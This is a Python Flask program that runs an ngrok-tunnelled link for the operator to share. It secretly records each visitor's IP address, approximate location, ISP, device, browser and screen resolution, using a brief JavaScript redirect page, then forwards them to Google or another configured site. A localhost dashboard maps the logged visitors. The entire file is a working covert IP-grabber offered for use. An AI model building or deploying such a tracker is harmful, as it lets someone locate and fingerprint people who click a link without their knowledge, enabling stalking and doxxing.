import os
import datetime
import json
import logging
from pathlib import Path
import geoip2.database
from flask import Flask, request, redirect, render_template, jsonify
from pyngrok import ngrok, conf
from dotenv import load_dotenv
from user_agents import parse as parse_user_agent

# Load environment variables from .env file
load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration variables
REDIRECT_URL = os.getenv('REDIRECT_URL', 'https://www.google.com/')
PORT = int(os.getenv('PORT', '5000'))
REQUEST_LOGGING_ENABLED = os.getenv('REQUEST_LOGGING_ENABLED', 'false').lower() == 'true'

DATA_DIR = Path(os.getenv('DATA_DIR', '.'))
GEOIP_DIR = Path(os.getenv('GEOIP_DIR', 'GeoLite2-City_20250528'))
CITY_DB_PATH = GEOIP_DIR / 'GeoLite2-City.mmdb'
ASN_DB_PATH = GEOIP_DIR / 'GeoLite2-ASN.mmdb'
LOG_FILE_PATH = DATA_DIR / 'visitor_logs.json'

# Get environment variables
ngrok_auth_token = os.getenv("NGROK_AUTH_TOKEN")
google_maps_api_key = os.getenv("GOOGLE_MAPS_API_KEY")

if not ngrok_auth_token:
    logger.error("NGROK_AUTH_TOKEN not found in environment variables.")
    exit(1)
    
if not google_maps_api_key:
    logger.warning("GOOGLE_MAPS_API_KEY not found in environment variables. Map rendering will be limited.")
    google_maps_api_key = ""

# Set ngrok auth token
conf.get_default().auth_token = ngrok_auth_token

# Initialize Flask app
app = Flask(__name__)

# Initialize log file if it doesn't exist
if not LOG_FILE_PATH.exists():
    LOG_FILE_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(LOG_FILE_PATH, 'w', encoding='utf-8') as f:
        json.dump([], f)
        
# Dictionary to track recent visits by IP to prevent duplicates
recent_visits = {}

def get_visitor_logs():
    """Read visitor logs from file"""
    try:
        with open(LOG_FILE_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return []

def save_visitor_log(log_data):
    """Save visitor log to file"""
    # Get visitor IP address
    ip_address = log_data.get('ip_address')
    current_time = datetime.datetime.now()
    
    # Check if this IP has visited recently (within 10 seconds)
    if ip_address in recent_visits:
        last_visit_time = recent_visits[ip_address]
        time_difference = (current_time - last_visit_time).total_seconds()
        
        # If less than 10 seconds have passed, don't log this visit
        if time_difference < 10:
            logger.debug("Skipping duplicate visit from %s within cooldown period", ip_address)
            return
    
    # Update the recent visits dictionary
    recent_visits[ip_address] = current_time
    
    # Clean up old entries from recent_visits (older than 1 minute)
    for ip in list(recent_visits.keys()):
        if (current_time - recent_visits[ip]).total_seconds() > 60:
            del recent_visits[ip]
    
    # Save the log
    logs = get_visitor_logs()
    logs.append(log_data)
    with open(LOG_FILE_PATH, 'w', encoding='utf-8') as f:
        json.dump(logs, f, indent=2)

def get_geolocation(ip_address):
    """Get geolocation data for an IP address"""
    result = {
        'country': 'Unknown',
        'city': 'Unknown',
        'latitude': 0,
        'longitude': 0,
        'isp': 'Unknown',
        'organization': 'Unknown',
        'asn': 'Unknown',
        'domain': 'Unknown'
    }
    
    try:
        # Get city/location information
        with geoip2.database.Reader(str(CITY_DB_PATH)) as reader:
            city_response = reader.city(ip_address)
            result.update({
                'country': city_response.country.name,
                'city': city_response.city.name,
                'latitude': city_response.location.latitude,
                'longitude': city_response.location.longitude
            })
    except Exception as e:
        logger.warning("Error getting city data for %s: %s", ip_address, e)
    
    try:
        # Try to get ISP information if ISP database is available
        if ASN_DB_PATH.exists():
            with geoip2.database.Reader(str(ASN_DB_PATH)) as reader:
                isp_response = reader.asn(ip_address)
                result.update({
                    'asn': f"AS{isp_response.autonomous_system_number}" if isp_response.autonomous_system_number else 'Unknown',
                    'organization': isp_response.autonomous_system_organization or 'Unknown'
                })
    except Exception as e:
        logger.warning("Error getting ASN data for %s: %s", ip_address, e)
    
    return result

def parse_user_agent_string(user_agent_str):
    """Parse user agent string and extract structured information"""
    # Default values
    result = {
        'device_type': 'N/A',
        'device_brand': 'N/A',
        'device_model': 'N/A',
        'os_family': 'N/A',
        'os_version': 'N/A',
        'browser_family': 'N/A',
        'browser_version': 'N/A',
        'is_mobile': False,
        'is_tablet': False,
        'is_pc': False,
        'is_bot': False,
        'bot_name': 'N/A'
    }
    
    try:
        # Parse the user agent string
        user_agent = parse_user_agent(user_agent_str)
        
        # Device information
        result['is_mobile'] = user_agent.is_mobile
        result['is_tablet'] = user_agent.is_tablet
        result['is_pc'] = user_agent.is_pc
        result['is_bot'] = user_agent.is_bot
        
        # Device type
        if user_agent.is_mobile:
            result['device_type'] = 'Mobile'
        elif user_agent.is_tablet:
            result['device_type'] = 'Tablet'
        elif user_agent.is_pc:
            result['device_type'] = 'Desktop/Laptop'
        elif user_agent.is_bot:
            result['device_type'] = 'Bot/Crawler'
        
        # Device details
        if user_agent.device.brand:
            result['device_brand'] = user_agent.device.brand
        if user_agent.device.model:
            result['device_model'] = user_agent.device.model
        
        # OS information
        if user_agent.os.family:
            result['os_family'] = user_agent.os.family
        if user_agent.os.version_string:
            result['os_version'] = user_agent.os.version_string
        
        # Browser information
        if user_agent.browser.family:
            result['browser_family'] = user_agent.browser.family
        if user_agent.browser.version_string:
            result['browser_version'] = user_agent.browser.version_string
            
        # Bot name for crawlers
        if user_agent.is_bot and user_agent_str.lower().find('facebook') >= 0:
            result['bot_name'] = 'Facebook Crawler'
        elif user_agent.is_bot:
            result['bot_name'] = user_agent.browser.family
    
    except Exception as e:
        logger.warning("Error parsing user agent string: %s", e)
    
    return result

def is_crawler(user_agent):
    """Determine if a user agent is a crawler/bot"""
    # List of common crawler identifiers
    crawler_identifiers = [
        'bot', 'crawler', 'spider', 'slurp', 'baiduspider',
        'yandex', 'facebookexternalhit', 'linkedinbot', 'twitterbot',
        'slackbot', 'telegrambot', 'whatsapp', 'ahrefsbot',
        'semrushbot', 'pingdom', 'googlebot', 'bingbot',
        'duckduckbot', 'yahoo', 'mj12bot', 'yeti',
        'screaming frog', 'sitechecker', 'datanyze'
    ]
    
    # Check if user agent contains any crawler identifier
    user_agent_lower = user_agent.lower()
    for identifier in crawler_identifiers:
        if identifier in user_agent_lower:
            return True
    
    return False

def get_client_ip():
    """Extract the real client IP address from request headers"""
    # Check for X-Forwarded-For header (standard for proxies)
    if request.headers.get('X-Forwarded-For'):
        # X-Forwarded-For can contain multiple IPs, the first one is the client
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    # Check for ngrok-specific headers
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
        
    # Check for Cloudflare headers
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    
    # Fall back to remote_addr
    return request.remote_addr

@app.route('/')
def track_and_redirect():
    """Track visitor and redirect to configured destination."""
    # Get visitor IP
    ip_address = get_client_ip()

    if REQUEST_LOGGING_ENABLED:
        logger.info("Incoming request metadata captured for IP resolution.")
    
    # Get user agent
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Get referrer information
    referrer = request.headers.get('Referer', 'Direct/Unknown')
    
    # Determine if visitor is a crawler or human
    visitor_type = 'crawler' if is_crawler(user_agent) else 'human'
    
    # Check for screen resolution data (passed via query parameters)
    screen_width = request.args.get('sw', 'Unknown')
    screen_height = request.args.get('sh', 'Unknown')
    screen_resolution = 'Unknown'
    if screen_width != 'Unknown' and screen_height != 'Unknown':
        screen_resolution = f"{screen_width}x{screen_height}"
    
    # If no screen resolution data and not a crawler, serve a page that captures it and then redirects
    # The 'logging=0' parameter indicates we shouldn't log this initial request
    if screen_resolution == 'Unknown' and 'capture=1' not in request.args and visitor_type != 'crawler' and 'logging' not in request.args:
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Redirecting...</title>
            <style>body {{ margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: white; }}</style>
        </head>
        <body>
            <script>
                // Get screen resolution
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;
                // Redirect with screen resolution data and logging flag
                window.location.href = '/?sw=' + screenWidth + '&sh=' + screenHeight + '&capture=1&logging=1';
            </script>
            <noscript><meta http-equiv="refresh" content="0;url={REDIRECT_URL}"></noscript>
        </body>
        </html>
        """
    
    # Skip logging if this is the initial request before screen resolution capture
    # Only log if explicitly told to log (logging=1) or if it's a crawler
    if 'logging' not in request.args and visitor_type != 'crawler':
        # Redirect without logging
        return redirect(REDIRECT_URL)
    
    # Get current time
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Get geolocation data
    geo_data = get_geolocation(ip_address)
    
    # Parse user agent for more detailed information
    user_agent_info = parse_user_agent_string(user_agent)
    
    # Create log entry
    log_entry = {
        'ip_address': ip_address,
        'timestamp': timestamp,
        'user_agent': user_agent,
        'country': geo_data.get('country', 'Unknown'),
        'city': geo_data.get('city', 'Unknown'),
        'latitude': geo_data.get('latitude', 0),
        'longitude': geo_data.get('longitude', 0),
        'isp': geo_data.get('isp', 'Unknown'),
        'organization': geo_data.get('organization', 'Unknown'),
        'asn': geo_data.get('asn', 'Unknown'),
        'domain': geo_data.get('domain', 'Unknown'),
        'visitor_type': visitor_type,
        'device_type': user_agent_info.get('device_type', 'N/A'),
        'device_brand': user_agent_info.get('device_brand', 'N/A'),
        'device_model': user_agent_info.get('device_model', 'N/A'),
        'os_family': user_agent_info.get('os_family', 'N/A'),
        'os_version': user_agent_info.get('os_version', 'N/A'),
        'browser_family': user_agent_info.get('browser_family', 'N/A'),
        'browser_version': user_agent_info.get('browser_version', 'N/A'),
        'bot_name': user_agent_info.get('bot_name', 'N/A'),
        'referrer': referrer,
        'screen_resolution': screen_resolution
    }
    
    # Save log entry
    save_visitor_log(log_entry)
    
    # Redirect to configured URL
    return redirect(REDIRECT_URL)

@app.route('/dashboard')
def dashboard():
    """Display dashboard with visitor logs"""
    # Only allow access from localhost
    if request.remote_addr not in ['127.0.0.1', '::1', 'localhost']:
        return "Access denied", 403
    
    # Get visitor logs
    logs = get_visitor_logs()
    
    # Render dashboard template
    return render_template('dashboard.html', logs=logs, google_maps_api_key=google_maps_api_key)

@app.route('/api/logs')
def api_logs():
    """API endpoint to get visitor logs"""
    # Only allow access from localhost
    if request.remote_addr not in ['127.0.0.1', '::1', 'localhost']:
        return jsonify({"error": "Access denied"}), 403
    
    # Get visitor logs
    logs = get_visitor_logs()
    
    # Filter by visitor type if specified
    visitor_type = request.args.get('visitor_type')
    if visitor_type in ['human', 'crawler']:
        logs = [log for log in logs if log.get('visitor_type') == visitor_type]
    
    return jsonify(logs)

def start_ngrok():
    """Start ngrok tunnel"""
    public_url = ngrok.connect(PORT).public_url
    logger.info("ngrok tunnel established at: %s", public_url)
    logger.info("Share this link: %s", public_url)
    logger.info("View dashboard at: http://localhost:%s/dashboard", PORT)
    return public_url

if __name__ == '__main__':
    # Start ngrok in a separate thread
    public_url = start_ngrok()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=PORT)
